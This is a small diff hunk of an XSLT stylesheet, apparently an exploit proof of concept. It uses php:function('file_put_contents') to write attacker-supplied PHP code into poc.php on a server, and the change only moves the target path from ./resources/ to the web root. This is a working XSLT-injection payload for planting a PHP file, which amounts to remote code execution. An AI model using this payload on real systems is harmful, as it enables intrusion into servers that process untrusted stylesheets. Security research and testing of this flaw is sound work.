@@ -12,7 +12,7 @@
 
     <!-- Appelle file_put_contents avec le contenu -->
     <html><body><pre>
-      <xsl:value-of select="php:function('file_put_contents', './resources/poc.php', $code)" />
+      <xsl:value-of select="php:function('file_put_contents', './poc.php', $code)" />
     </pre></body></html>
 
   </xsl:template>
